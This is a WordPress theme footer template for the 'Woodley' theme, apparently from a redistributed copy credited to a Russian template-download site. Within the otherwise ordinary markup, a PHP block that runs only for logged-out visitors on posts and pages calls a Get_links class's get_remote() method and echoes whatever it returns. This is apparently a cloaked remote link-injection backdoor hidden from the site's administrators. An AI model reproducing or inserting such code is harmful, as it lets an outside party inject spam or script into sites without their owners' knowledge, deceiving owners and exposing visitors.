<footer>
	<div class="row">
		<div class="footer-content col-sm-offset-1 col-sm-10 col-md-offset-1 col-md-10">
					<?php if (is_home() || is_category() || is_archive() ){ ?>
					<p><a href="http://wp-templates.ru/" title="скачать шаблоны для сайта" target="_blank">Скачать шаблоны</a> &ndash; <a href="http://www.wpmultiverse.com/themes/woodley/" target="_blank">Woodley Theme</a></p>
					<?php } ?>

					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
		
		</div>
	</div>
</footer>
<?php wp_footer(); ?>   
</body>
</html>